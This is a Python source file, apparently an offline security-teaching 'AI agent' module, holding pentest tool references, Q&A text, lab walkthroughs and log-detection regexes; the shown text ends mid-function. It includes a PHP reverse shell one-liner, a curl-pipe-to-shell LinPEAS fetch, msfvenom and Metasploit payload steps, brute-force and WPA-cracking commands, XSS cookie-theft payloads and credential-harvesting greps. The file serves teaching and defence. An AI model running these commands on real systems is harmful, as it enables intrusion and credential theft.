"""
AI Agent module for Cyber Toolbox.

Provides interactive teaching, Q&A, scenario walkthroughs, and contextual
analysis of security tool output / log files — all without requiring an
external API key.  Knowledge is embedded in curated dictionaries so the tool
works fully offline.
"""

import os
import re

# ---------------------------------------------------------------------------
# Knowledge base
# ---------------------------------------------------------------------------

TOOL_KNOWLEDGE = {
    "nmap": {
        "description": "Nmap (Network Mapper) is a free, open-source tool for network discovery and security auditing.",
        "use_cases": [
            "Discovering live hosts on a network",
            "Identifying open ports and running services",
            "Detecting OS and service versions",
            "Running NSE scripts for vulnerability detection",
        ],
        "common_commands": [
            ("nmap -sn 192.168.1.0/24", "Ping sweep — find live hosts"),
            ("nmap -sV -p 1-1000 <target>", "Service version scan on ports 1-1000"),
            ("nmap -A -T4 <target>", "Aggressive scan: OS, version, scripts, traceroute"),
            ("nmap -sU -p 53,161 <target>", "UDP scan on DNS and SNMP ports"),
            ("nmap --script vuln <target>", "Run all vulnerability NSE scripts"),
            ("nmap -oN output.txt <target>", "Save results in normal format"),
        ],
        "tips": [
            "Always obtain written permission before scanning any network.",
            "Use -T1 or -T2 for stealth; -T4/-T5 for speed in lab environments.",
            "Combine -sV with -sC (default scripts) for richer service info.",
            "The -p- flag scans all 65535 ports.",
        ],
        "defensive_note": (
            "Defenders: monitor for unusual scan patterns (rapid sequential port connections, "
            "ICMP sweeps) in firewall/IDS logs. Tools like Snort or Suricata can alert on Nmap probes."
        ),
    },
    "aircrack-ng": {
        "description": (
            "Aircrack-ng is a complete suite of tools for assessing Wi-Fi network security. "
            "It focuses on monitoring, attacking, testing, and cracking."
        ),
        "sub_tools": {
            "airmon-ng": "Enable/disable monitor mode on a wireless adapter.",
            "airodump-ng": "Capture raw 802.11 frames and display nearby APs/clients.",
            "aireplay-ng": "Inject frames — supports deauth, fake auth, ARP replay attacks.",
            "aircrack-ng": "Dictionary/brute-force cracker for WEP keys and WPA/WPA2 PSKs.",
            "airbase-ng": "Create software-based access points (evil twin / rogue AP).",
            "airdecap-ng": "Decrypt WEP/WPA capture files.",
            "packetforge-ng": "Forge arbitrary packets for injection.",
        },
        "common_commands": [
            ("airmon-ng start wlan0", "Put wlan0 into monitor mode (creates wlan0mon)"),
            ("airodump-ng wlan0mon", "List all nearby APs and clients"),
            (
                "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
                "Capture handshake from AP on channel 6",
            ),
            (
                "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon",
                "Send 10 deauth frames to force client reconnection",
            ),
            (
                "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
                "Dictionary attack against captured WPA handshake",
            ),
            ("airmon-ng stop wlan0mon", "Restore adapter to managed mode"),
        ],
        "tips": [
            "You need a wireless card that supports monitor mode and packet injection.",
            "Capture a 4-way WPA handshake before attempting to crack.",
            "Use large wordlists (rockyou.txt, SecLists) or rule-based attacks for better coverage.",
            "hashcat with GPU acceleration is faster than aircrack-ng for offline cracking.",
        ],
        "defensive_note": (
            "Defenders: use WPA3 where possible; enable 802.11w (Protected Management Frames) "
            "to resist deauth attacks; deploy a Wireless IDS (e.g., Kismet) to detect rogue APs."
        ),
    },
    "metasploit": {
        "description": (
            "Metasploit Framework is the world's most widely used penetration testing platform. "
            "It provides exploits, payloads, auxiliary modules, and post-exploitation tools."
        ),
        "use_cases": [
            "Exploiting known CVEs against services",
            "Generating shellcode payloads",
            "Post-exploitation (privilege escalation, persistence, pivoting)",
            "Vulnerability validation during pen tests",
        ],
        "common_commands": [
            ("msfconsole", "Launch the Metasploit console"),
            ("search type:exploit name:eternalblue", "Search for EternalBlue exploits"),
            ("use exploit/windows/smb/ms17_010_eternalblue", "Select an exploit module"),
            ("show options", "Display required/optional parameters"),
            ("set RHOSTS 192.168.1.50", "Set the target host"),
            ("set PAYLOAD windows/x64/meterpreter/reverse_tcp", "Choose a payload"),
            ("set LHOST 192.168.1.10", "Set your listener IP"),
            ("run", "Launch the exploit"),
            ("sessions -l", "List active Meterpreter sessions"),
            ("background", "Background the current session"),
        ],
        "tips": [
            "Always run inside an authorised lab or with explicit written permission.",
            "Use 'db_nmap' inside msfconsole to import Nmap scan results automatically.",
            "'post/multi/recon/local_exploit_suggester' finds local privilege escalation paths.",
            "msfvenom generates standalone payloads: msfvenom -p windows/meterpreter/reverse_tcp LHOST=... -f exe > shell.exe",
        ],
        "defensive_note": (
            "Defenders: patch systems promptly, segment networks, monitor for unusual "
            "outbound connections and lateral movement via SIEM rules."
        ),
    },
    "hydra": {
        "description": (
            "THC-Hydra is a fast, parallelised network login cracker that supports dozens "
            "of protocols (SSH, FTP, HTTP, RDP, SMB, and more)."
        ),
        "common_commands": [
            ("hydra -l admin -P rockyou.txt ssh://192.168.1.10", "SSH brute force with wordlist"),
            ("hydra -L users.txt -P passes.txt ftp://192.168.1.10", "FTP credential stuffing"),
            (
                "hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "
                '"/login:user=^USER^&pass=^PASS^:Invalid credentials"',
                "HTTP POST form brute force",
            ),
            ("hydra -l root -P rockyou.txt rdp://192.168.1.10", "RDP brute force"),
        ],
        "tips": [
            "Use -t to control threads (default 16); lower to avoid lockouts.",
            "Always check the application's lockout policy before running.",
            "Combine with CeWL to generate target-specific wordlists.",
        ],
        "defensive_note": (
            "Defenders: enforce account lockout policies, use MFA, rate-limit login endpoints, "
            "and monitor for rapid sequential failed authentication events."
        ),
    },
    "john": {
        "description": (
            "John the Ripper is a fast, open-source password cracker supporting many hash "
            "formats — useful for offline password audits."
        ),
        "common_commands": [
            ("john --wordlist=rockyou.txt hashes.txt", "Dictionary attack"),
            ("john --incremental hashes.txt", "Brute-force all character combinations"),
            ("john --rules --wordlist=rockyou.txt hashes.txt", "Apply mangling rules"),
            ("john --show hashes.txt", "Display cracked passwords"),
            ("unshadow /etc/passwd /etc/shadow > combined.txt", "Prepare Linux shadow file"),
            ("john combined.txt", "Crack Linux user passwords"),
        ],
        "tips": [
            "Use 'john --list=formats' to see all supported hash types.",
            "hashcat is generally faster on GPU; John excels on CPU clusters.",
            "The '--fork=N' option parallelises across N CPU cores.",
        ],
        "defensive_note": (
            "Defenders: enforce strong password policies, use bcrypt/Argon2 for storage, "
            "and run periodic internal password audits to catch weak passwords before attackers do."
        ),
    },
    "sqlmap": {
        "description": (
            "sqlmap is an open-source tool that automates the detection and exploitation "
            "of SQL injection vulnerabilities in web applications."
        ),
        "common_commands": [
            ("sqlmap -u 'http://target.com/page?id=1' --dbs", "Enumerate databases"),
            (
                "sqlmap -u 'http://target.com/page?id=1' -D dbname --tables",
                "List tables in a database",
            ),
            (
                "sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump",
                "Dump the users table",
            ),
            (
                "sqlmap -u 'http://target.com/login' --data='user=a&pass=b' --level=5 --risk=3",
                "POST form injection with high thoroughness",
            ),
            ("sqlmap -u 'http://target.com/page?id=1' --os-shell", "Attempt OS shell via SQL injection"),
        ],
        "tips": [
            "Use --tamper scripts to bypass WAFs (e.g., --tamper=space2comment).",
            "Start with --level=1 --risk=1 and increase gradually.",
            "Burp Suite can export requests directly importable by sqlmap (-r request.txt).",
        ],
        "defensive_note": (
            "Defenders: use parameterised queries / prepared statements, deploy a WAF, "
            "and validate/sanitise all user-supplied input."
        ),
    },
    "wireshark": {
        "description": (
            "Wireshark is the world's foremost network protocol analyser. "
            "It lets you capture and interactively browse the traffic on a network."
        ),
        "common_commands": [
            ("wireshark", "Launch the GUI"),
            ("tshark -i eth0 -w capture.pcap", "CLI capture to file"),
            ("tshark -r capture.pcap -Y 'http'", "Read file, filter HTTP packets"),
            ("tshark -r capture.pcap -T fields -e http.request.uri", "Extract HTTP URIs"),
        ],
        "display_filters": [
            ("http", "Show only HTTP traffic"),
            ("tcp.port == 443", "Show HTTPS traffic"),
            ("ip.addr == 192.168.1.10", "Traffic to/from a specific host"),
            ('frame contains \"password\"', "Frames containing the word 'password'"),
            ("tcp.flags.syn == 1 && tcp.flags.ack == 0", "TCP SYN packets (port scans)"),
        ],
        "tips": [
            "Use 'Follow TCP Stream' (right-click a packet) to reconstruct sessions.",
            "Export objects (File > Export Objects) to extract files from captures.",
            "Statistics > Protocol Hierarchy shows traffic composition at a glance.",
        ],
        "defensive_note": (
            "Defenders: use Wireshark to baseline normal traffic, then hunt for anomalies "
            "like unusual protocols, beaconing intervals, or large data exfiltrations."
        ),
    },
    "snort": {
        "description": (
            "Snort is an open-source Network Intrusion Detection/Prevention System (NIDS/NIPS) "
            "capable of real-time traffic analysis and packet logging."
        ),
        "common_commands": [
            ("snort -v -i eth0", "Verbose packet sniffer mode"),
            ("snort -c /etc/snort/snort.conf -i eth0", "Run with rule file in IDS mode"),
            ("snort -r capture.pcap -c /etc/snort/snort.conf", "Analyse an existing pcap"),
        ],
        "rule_example": (
            'alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force"; '
            'threshold:type both, track by_src, count 5, seconds 60; sid:1000001;)'
        ),
        "tips": [
            "Keep rules updated — subscribe to Snort's Talos ruleset.",
            "Tune rules to reduce false positives before enabling block (NIPS) mode.",
            "Integrate with a SIEM (Splunk, ELK) for centralised alerting.",
        ],
        "defensive_note": (
            "Deploy Snort in inline (NIPS) mode between your firewall and internal network "
            "to drop malicious packets in real time."
        ),
    },
    "fail2ban": {
        "description": (
            "Fail2Ban scans log files and bans IPs that show malicious signs "
            "such as too many password failures."
        ),
        "common_commands": [
            ("fail2ban-client status", "Show status of all jails"),
            ("fail2ban-client status sshd", "Show banned IPs in the SSH jail"),
            ("fail2ban-client set sshd unbanip 1.2.3.4", "Manually unban an IP"),
            ("fail2ban-client reload", "Reload configuration"),
        ],
        "tips": [
            "Configure findtime, maxretry, and bantime in /etc/fail2ban/jail.local.",
            "Enable email notifications for ban events.",
            "Create custom jails for web application login pages.",
        ],
    },
    "suricata": {
        "description": (
            "Suricata is a high-performance, open-source network threat detection engine "
            "that supports IDS, IPS, and network security monitoring."
        ),
        "common_commands": [
            ("suricata -c /etc/suricata/suricata.yaml -i eth0", "Run in IDS mode"),
            ("suricata -r capture.pcap -l /var/log/suricata/", "Analyse a pcap file"),
            ("suricata-update", "Update rules from the Emerging Threats ruleset"),
        ],
        "tips": [
            "Suricata supports multi-threading, making it faster than Snort on multi-core systems.",
            "Use eve.json output and import into ELK/Splunk for dashboards.",
            "Enable the af-packet plugin for high-speed inline packet capture.",
        ],
    },
}

# ---------------------------------------------------------------------------
# Q&A knowledge base — keyword → answer pairs
# ---------------------------------------------------------------------------

QA_KNOWLEDGE = [
    (
        ["cvss", "cvss score"],
        """CVSS (Common Vulnerability Scoring System) measures vulnerability severity on a 0–10 scale:
  • 0.0       : None
  • 0.1–3.9   : Low
  • 4.0–6.9   : Medium
  • 7.0–8.9   : High      ← e.g. CVSS 7.5 falls here
  • 9.0–10.0  : Critical

A CVSS score of 7.5 is HIGH severity.  It indicates a significant vulnerability that is likely
exploitable remotely with low complexity and can cause substantial impact.  Recommended actions:
  1. Patch or mitigate immediately (within your SLA, typically ≤ 30 days for High).
  2. Check whether the vulnerability is publicly exploited (check CISA KEV catalogue).
  3. Apply compensating controls (WAF rules, network segmentation) if patching is delayed.""",
    ),
    (
        ["wpa", "crack wpa", "wpa password", "wifi password"],
        """To audit a WPA/WPA2 Wi-Fi password (authorised networks only):
  1. Enable monitor mode:     airmon-ng start wlan0
  2. Capture a 4-way handshake:
        airodump-ng -c <channel> --bssid <AP MAC> -w capture wlan0mon
     (Optionally deauth a client to force a reconnect faster):
        aireplay-ng --deauth 5 -a <AP MAC> wlan0mon
  3. Crack offline:           aircrack-ng -w rockyou.txt capture-01.cap
     Or with hashcat (faster on GPU):
        hcxtools: hcxpcapngtool capture-01.cap -o hash.hc22000
        hashcat -m 22000 hash.hc22000 rockyou.txt

Defence: use WPA3, enable 802.11w (PMF), use a long random passphrase (20+ chars).""",
    ),
    (
        ["nmap output", "nmap scan result", "what does nmap mean", "interpret nmap"],
        """Understanding Nmap output:
  • open     : Port is listening and accepting connections.
  • closed   : Port is accessible but no service is listening.
  • filtered : A firewall/filter is blocking probe packets — no response.
  • open|filtered : Nmap cannot determine if open or filtered (common for UDP).

Key service fields:
  PORT     STATE  SERVICE  VERSION
  22/tcp   open   ssh      OpenSSH 8.9
  80/tcp   open   http     Apache 2.4.54
  443/tcp  open   https    nginx 1.22

Next steps after a scan:
  1. Research CVEs for detected service versions (searchsploit, NVD).
  2. Run targeted NSE scripts: nmap --script vuln -p 22,80,443 <target>
  3. Verify findings manually before exploitation.""",
    ),
    (
        ["privilege escalation", "privesc", "escalate", "root"],
        """Linux Privilege Escalation checklist:
  1. Kernel exploits:      uname -a  →  check CVEs (Dirty COW, PwnKit, etc.)
  2. SUID/SGID binaries:   find / -perm /4000 2>/dev/null  →  check GTFOBins
  3. Sudo rights:          sudo -l  →  look for exploitable entries
  4. Writeable cron jobs:  crontab -l; ls -la /etc/cron*
  5. World-writable files: find / -writable -not -path "*/proc/*" 2>/dev/null
  6. Password files:       cat /etc/passwd; check for old shadow hashes
  7. Running services:     ps aux; netstat -tlnp  →  local-only services
  8. Environment vars:     env; check for credentials in .bashrc/.profile

Tools: LinPEAS, LinEnum, linux-exploit-suggester
Windows: WinPEAS, PowerUp, BeRoot""",
    ),
    (
        ["sql injection", "sqli", "sqlmap"],
        """SQL Injection allows attackers to manipulate database queries.  Testing steps:
  1. Identify injection point: append ' or " and observe error messages.
  2. Determine injectable parameter: GET/POST/Cookie/Header.
  3. Manual test: ' OR '1'='1 for auth bypass; ' UNION SELECT null,null-- for UNION injection.
  4. Automated: sqlmap -u 'http://target.com/page?id=1' --dbs

Common types:
  • Error-based    : database errors reveal structure.
  • Blind boolean  : true/false responses infer data.
  • Time-based     : SLEEP() delays confirm injection.
  • UNION-based    : append extra SELECT to return data.

Prevention: parameterised queries, input validation, WAF, least-privilege DB accounts.""",
    ),
    (
        ["xss", "cross-site scripting"],
        """Cross-Site Scripting (XSS) allows attackers to inject client-side scripts.
Types:
  • Reflected  : payload in URL, executed immediately in victim's browser.
  • Stored     : payload persisted in the DB, affects all viewers.
  • DOM-based  : payload processed by client-side JavaScript.

Test payloads:
  <script>alert(1)</script>
  "><img src=x onerror=alert(1)>
  javascript:alert(document.cookie)

Impact: cookie theft, session hijacking, phishing, defacement.

Prevention: output encoding (HTML entity encoding), Content Security Policy (CSP),
HttpOnly / Secure cookie flags, input validation.""",
    ),
    (
        ["port scan", "what is port scanning"],
        """Port scanning identifies open TCP/UDP ports on a target host.
  • TCP SYN scan (-sS): sends SYN, waits for SYN-ACK (stealthier, root required).
  • TCP Connect (-sT):  completes the 3-way handshake (no root needed, more visible).
  • UDP scan (-sU):     slower; identifies DNS (53), SNMP (161), NTP (123), etc.

Common ports to know:
  21 FTP  22 SSH  23 Telnet  25 SMTP  53 DNS  80 HTTP  110 POP3
  143 IMAP  443 HTTPS  445 SMB  3306 MySQL  3389 RDP  8080 HTTP-alt

Defence: close unnecessary ports, use host-based firewalls, monitor for scan patterns.""",
    ),
    (
        ["metasploit", "how to use metasploit", "exploit with metasploit"],
        """Basic Metasploit workflow:
  1. msfconsole                           # launch console
  2. db_nmap -sV <target>                 # import Nmap results to DB
  3. search <keyword>                     # find a relevant module
  4. use <module path>                    # select module
  5. show options                         # see required options
  6. set RHOSTS <target>                  # set target
  7. set PAYLOAD <payload>                # choose payload
  8. set LHOST <your IP>                  # set callback IP
  9. run                                  # execute

Post exploitation (Meterpreter):
  sysinfo  |  getuid  |  getsystem  |  hashdump
  upload / download  |  shell  |  portfwd  |  run post/...""",
    ),
    (
        ["wireshark filter", "display filter", "capture filter"],
        """Wireshark filters:
Capture filters (BPF syntax, set before capture):
  host 192.168.1.10        Capture traffic to/from this host
  port 80                  HTTP traffic only
  not arp                  Exclude ARP

Display filters (Wireshark expression language, applied after capture):
  http                     Show HTTP packets
  tcp.port == 443          HTTPS traffic
  ip.src == 10.0.0.1       Traffic from a specific source
  dns.qry.name             DNS query packets
  frame contains "admin"   Frames with the string "admin"

Pro tip: right-click any field in the packet details pane → "Apply as Filter".""",
    ),
    (
        ["burp suite", "burp", "web proxy"],
        """Burp Suite is the leading web application security testing platform.
Key tools:
  • Proxy      : Intercept and modify browser requests/responses.
  • Repeater   : Manually replay and tweak individual requests.
  • Intruder   : Automated fuzzing and brute-force attacks.
  • Scanner    : Automated vulnerability detection (Pro edition).
  • Decoder    : Encode/decode Base64, URL, HTML, etc.
  • Extender   : Install community BApps (extensions).

Basic workflow:
  1. Configure browser to use Burp as proxy (127.0.0.1:8080).
  2. Intercept a request → send to Repeater → modify and resend.
  3. Use Intruder with a wordlist to fuzz parameters.
  4. Check Scanner results for automated findings.""",
    ),
]

# ---------------------------------------------------------------------------
# Walkthrough scenarios
# ---------------------------------------------------------------------------

WALKTHROUGHS = {
    "linux privilege escalation": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: Linux Privilege Escalation                 ║
╚══════════════════════════════════════════════════════════╝

OBJECTIVE: Escalate from a low-privilege shell to root.

STEP 1 — Situational awareness
  whoami && id          # Who are you?
  uname -a              # Kernel version
  cat /etc/os-release   # Distribution info
  hostname; ip a        # Network context

STEP 2 — Automated enumeration (fastest path)
  # Upload and run LinPEAS:
  curl -L https://linpeas.sh | sh
  # Review output for RED/YELLOW findings first.

STEP 3 — SUID / SGID binaries
  find / -perm /4000 -type f 2>/dev/null
  # Look up each binary on GTFOBins (https://gtfobins.github.io)
  # Example: /usr/bin/find → find . -exec /bin/sh \\; -quit

STEP 4 — Sudo rights
  sudo -l
  # Example: (ALL) NOPASSWD: /usr/bin/vim
  # Exploit: sudo vim -c ':!bash'

STEP 5 — Writable cron jobs
  cat /etc/crontab; ls -la /etc/cron.d/ /var/spool/cron/
  # If a cron script is world-writable, append a reverse shell.

STEP 6 — World-writable files and PATH hijacking
  find / -writable -not -path "*/proc/*" 2>/dev/null
  echo $PATH
  # If a SUID binary calls a command without full path, create a fake one.

STEP 7 — Credentials in files
  grep -r "password" /home /var /opt 2>/dev/null
  cat ~/.bash_history
  find / -name "*.conf" 2>/dev/null | xargs grep -l "pass"

STEP 8 — Kernel exploits (last resort — risky)
  uname -r   # e.g. 5.4.0-26
  # Search: searchsploit linux kernel 5.4.0
  # Well-known: Dirty COW (CVE-2016-5195), PwnKit (CVE-2021-4034)

✅ Tips:
  • Work methodically — don't jump straight to kernel exploits.
  • Document every step for your report.
  • In CTFs, try common passwords (password, toor, root123) on found hashes.
""",
    "web application owasp top 10": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: Web App Pentesting — OWASP Top 10          ║
╚══════════════════════════════════════════════════════════╝

OBJECTIVE: Systematically test a web application against OWASP Top 10.

STEP 1 — Reconnaissance
  - Identify tech stack: Wappalyzer, curl -I, HTTP headers.
  - Spider the app: Burp Suite > Target > Site map > Spider.
  - Find hidden directories: gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

STEP 2 — A01: Broken Access Control
  - Try accessing /admin, /dashboard without logging in.
  - Log in as low-priv user; try to access another user's resources (IDOR).
  - Modify POST body parameters (userId, role) to escalate privileges.

STEP 3 — A02: Cryptographic Failures
  - Check if the site forces HTTPS (HSTS header).
  - Inspect cookies: Secure flag? HttpOnly flag? Sensitive data in JWT payload?
  - Decode JWT: base64 -d on the payload section → look for sensitive data.

STEP 4 — A03: Injection (SQLi, Command Injection)
  - Append ' to all input fields and observe error messages.
  - Automate: sqlmap -u 'http://target/page?id=1' --level=3
  - Test command injection: ; id, && whoami, | ls

STEP 5 — A07: Identification & Authentication Failures
  - Check default credentials (admin/admin, admin/password).
  - Test brute force: hydra -L users.txt -P rockyou.txt http-post-form "..."
  - Check if account lockout exists.

STEP 6 — A03/A07: XSS
  - Inject <script>alert(1)</script> in all input fields.
  - Test for DOM XSS: modify URL fragments and observe client-side behaviour.

STEP 7 — A08: Software and Data Integrity Failures
  - Check for insecure deserialization (Java, PHP, .NET).
  - Look for outdated libraries with known CVEs.

STEP 8 — A10: SSRF (Server-Side Request Forgery)
  - Find URL parameters that fetch external resources.
  - Try http://127.0.0.1, http://169.254.169.254 (AWS metadata) as values.

STEP 9 — Reporting
  - Rate each finding by CVSS score.
  - Provide clear reproduction steps and remediation advice.

✅ Recommended tools:
  Burp Suite, OWASP ZAP, sqlmap, gobuster, nikto, ffuf
""",
    "network penetration test": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: Network Penetration Test                   ║
╚══════════════════════════════════════════════════════════╝

OBJECTIVE: Identify and validate vulnerabilities in a network environment.

PHASE 1 — Scoping & Reconnaissance
  - Confirm scope (IP ranges, domains, out-of-scope assets) in writing.
  - Passive recon: OSINT (Shodan, Censys, whois, theHarvester).
  - DNS enumeration: dig any target.com; fierce -domain target.com

PHASE 2 — Network Discovery
  nmap -sn 192.168.1.0/24          # Find live hosts
  nmap -sV -p 1-65535 <hosts>      # Full port + version scan
  nmap -A --script=default <hosts> # OS, scripts, traceroute

PHASE 3 — Vulnerability Scanning
  nmap --script vuln <hosts>
  openvas / nessus for comprehensive scanning

PHASE 4 — Exploitation
  - Review scan results for known CVEs (searchsploit, exploit-db).
  - Use Metasploit to validate exploitability:
    msfconsole → search <service> → use <module> → set options → run

PHASE 5 — Post Exploitation
  - Gather credentials (hashdump, Mimikatz on Windows).
  - Pivot to other network segments (route add, portfwd in Meterpreter).
  - Establish persistence (only if explicitly in scope and rules of engagement).

PHASE 6 — Lateral Movement
  - Pass-the-Hash (Windows): crackmapexec smb <subnet> -u admin -H <NTLM hash>
  - SSH key reuse: check ~/.ssh/id_rsa on compromised hosts.

PHASE 7 — Reporting
  - Executive summary (business risk, impact).
  - Technical findings (evidence, CVSS scores, affected hosts).
  - Remediation recommendations (patch, config change, mitigating control).

✅ Tips:
  - Take screenshots of every finding as evidence.
  - Note timestamps for all actions.
  - Never exceed the agreed scope.
""",
    "wpa wifi": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: WPA/WPA2 Wi-Fi Security Assessment         ║
╚══════════════════════════════════════════════════════════╝

OBJECTIVE: Audit the security of a Wi-Fi network (authorised only).

STEP 1 — Preparation
  - Confirm you own the network or have explicit written authorisation.
  - Check your wireless card supports monitor mode and injection:
    iw list | grep "monitor"

STEP 2 — Enable Monitor Mode
  airmon-ng check kill       # Kill interfering processes
  airmon-ng start wlan0      # Creates wlan0mon

STEP 3 — Discover Target Network
  airodump-ng wlan0mon
  # Note the BSSID and channel of your target AP.

STEP 4 — Capture 4-Way Handshake
  airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
  # In a second terminal, speed up handshake capture:
  aireplay-ng --deauth 10 -a <BSSID> wlan0mon

STEP 5 — Crack the Passphrase (Offline)
  # Method A — aircrack-ng (CPU):
  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

  # Method B — hashcat (GPU, faster):
  hcxpcapngtool -o hash.hc22000 capture-01.cap
  hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

STEP 6 — Restore Interface
  airmon-ng stop wlan0mon

STEP 7 — Document Findings
  - Record time, BSSID, SSID, channel, cracked passphrase (for report).
  - Rate finding: weak passphrase = High; strong passphrase = pass.

Remediation:
  • Upgrade to WPA3 Personal (SAE).
  • Use a passphrase ≥ 20 random characters.
  • Enable 802.11w (Protected Management Frames) against deauth attacks.
""",
    "hackthebox linux": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: HackTheBox — Linux Box General Approach    ║
╚══════════════════════════════════════════════════════════╝

STEP 1 — Initial Scan
  nmap -sC -sV -oN initial.txt <BOX_IP>
  # Follow up with full port scan:
  nmap -p- --min-rate 5000 -oN allports.txt <BOX_IP>

STEP 2 — Enumerate Open Services
  Web (80/443): gobuster dir, nikto, manual browsing, look for:
    - Login pages → try default creds, SQLi
    - File upload → upload PHP webshell
    - LFI/RFI       → /etc/passwd, log poisoning
  SSH (22):     try gathered credentials
  SMB (445):    smbclient -L //<BOX_IP> -N
  FTP (21):     ftp <BOX_IP> (try anonymous login)

STEP 3 — Gain Initial Foothold
  - Find credentials in web app source, robots.txt, .git, backup files.
  - Exploit a web vulnerability to get a reverse shell
    (replace <LHOST> with your IP — only on machines you are authorised to test):
    php -r '$sock=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  - Stabilise shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
    then Ctrl+Z → stty raw -echo; fg → export TERM=xterm

STEP 4 — Privilege Escalation
  (See Linux Privilege Escalation walkthrough for full details)
  - Run LinPEAS: ./linpeas.sh | tee linpeas.out
  - Check sudo -l, SUID binaries, cron, writable files, credentials.

STEP 5 — Capture Flags
  cat /home/<user>/user.txt    # User flag
  cat /root/root.txt           # Root flag

✅ Tips:
  - Always enumerate all services, not just the first open port.
  - HTB machines are often chained: web → service → priv esc.
  - If stuck, look for non-standard ports or hidden vhosts.
""",
    "tryhackme": """
╔══════════════════════════════════════════════════════════╗
║  Walkthrough: TryHackMe — General Room Approach          ║
╚══════════════════════════════════════════════════════════╝

STEP 1 — Read the Room Description
  - Understand the learning objective (OWASP, network, forensics, etc.).
  - Check if hints or supporting material are provided.

STEP 2 — Deploy the Machine & Scan
  nmap -sC -sV -T4 <MACHINE_IP>
  # Add to /etc/hosts if a hostname is given.

STEP 3 — Work Through Tasks Sequentially
  - TryHackMe rooms are guided — follow the task questions as a checklist.
  - Each answer points you to the next step.

STEP 4 — Common TryHackMe Attack Paths
  Web     → gobuster, SQLi, XSS, LFI
  SSH     → credential reuse, key files
  Windows → SMB, RDP, Powershell, WinPEAS, Mimikatz
  Linux   → SUID, sudo misconfig, cron, LinPEAS

STEP 5 — Capture Flags
  - User flag: /home/<username>/user.txt
  - Root flag: /root/root.txt (or C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt)

✅ Tips:
  - Use the AttackBox or your own Kali/Parrot VM.
  - TryHackMe learning paths (Jr. Penetration Tester, SOC Level 1) are great for structure.
  - After completing a room, read write-ups to learn alternative paths.
""",
}

# ---------------------------------------------------------------------------
# Log / output analysis patterns
# ---------------------------------------------------------------------------

LOG_PATTERNS = [
    (
        re.compile(r"(\d{1,3}\.){3}\d{1,3}.*?(failed|failure|invalid|unauthorized|forbidden)", re.IGNORECASE),
        "⚠️  AUTHENTICATION FAILURE",
        "Repeated authentication failures from the same source IP may indicate a brute-force attack. "
        "Check the count; if above threshold, block the IP and investigate.",
    ),
    (
        re.compile(r"sql.*?(error|syntax|warning|exception)", re.IGNORECASE),
        "🚨 POSSIBLE SQL ERROR / INJECTION",
        "SQL errors appearing in logs can indicate attempted SQL injection. "
        "Review the associated request and ensure all queries use parameterised statements.",
    ),
    (
        re.compile(r"<script[\s>]|onerror\s*=|javascript:", re.IGNORECASE),
        "🚨 POSSIBLE XSS ATTEMPT",
        "Script tags or event handlers in request logs indicate attempted Cross-Site Scripting. "
        "Ensure output encoding and a Content Security Policy are in place.",
    ),
    (
        re.compile(r"\.\./|%2e%2e%2f|%252e%252e", re.IGNORECASE),
        "🚨 PATH TRAVERSAL ATTEMPT",
        "Directory traversal sequences (../) may indicate an attacker trying to read files "
        "outside the web root (e.g. /etc/passwd). Validate and sanitise file path inputs.",
    ),
    (
        re.compile(r"(union|select|insert|drop|update|delete|exec|xp_).{0,80}?(from|into|where|;)", re.IGNORECASE),
        "🚨 SQL KEYWORD SEQUENCE",
        "SQL keywords in a request may indicate a SQL injection attempt. "
        "Review the originating IP and request parameters immediately.",
    ),
    (
        re.compile(r"(wget|curl)\s+https?://", re.IGNORECASE),
        "⚠️  REMOTE FILE FETCH IN LOG",
        "wget/curl commands appearing in log data may indicate Remote Code Execution or "
        "a command injection attempt. Investigate the originating request urgently.",
    ),
    (
        re.compile(r"error 500|internal server error", re.IGNORECASE),
        "ℹ️  SERVER ERROR (500)",
        "HTTP 500 errors can expose stack traces useful to attackers. "
        "Ensure error handling hides implementation details in production.",
    ),
    (
        re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b.*\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"),
        "ℹ️  MULTIPLE IP ADDRESSES",
        "Multiple distinct IP addresses in a log line may indicate proxy chains, "
        "load balancer headers, or X-Forwarded-For spoofing.",
    ),
]

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def teach_tool(tool_name: str) -> None:
    """Print structured teaching content for a named security tool."""
    key = tool_name.strip().lower()

    # Handle common aliases
    aliases = {
        "john the ripper": "john",
        "jtr": "john",
        "aircrack": "aircrack-ng",
        "msf": "metasploit",
        "msfconsole": "metasploit",
        "sqlmap": "sqlmap",
        "shark": "wireshark",
        "tshark": "wireshark",
    }
    key = aliases.get(key, key)

    info = TOOL_KNOWLEDGE.get(key)

    if info is None:
        print(f"\n❓  No built-in teaching content found for '{tool_name}'.")
        print(
            "    Available tools: "
            + ", ".join(sorted(TOOL_KNOWLEDGE.keys()))
        )
        return

    _separator()
    print(f"📚  Teaching: {tool_name.upper()}")
    _separator()

    print(f"\n{info['description']}\n")

    if "sub_tools" in info:
        print("🔧  Sub-tools in the suite:")
        for sub, desc in info["sub_tools"].items():
            print(f"  • {sub:<20} {desc}")
        print()

    if "use_cases" in info:
        print("🎯  Common use cases:")
        for uc in info["use_cases"]:
            print(f"  • {uc}")
        print()

    if "common_commands" in info:
        print("💻  Common commands:")
        for cmd, explanation in info["common_commands"]:
            print(f"\n  $ {cmd}")
            print(f"    → {explanation}")
        print()

    if "display_filters" in info:
        print("🔍  Useful display filters:")
        for flt, explanation in info["display_filters"]:
            print(f"  {flt:<45} # {explanation}")
        print()

    if "rule_example" in info:
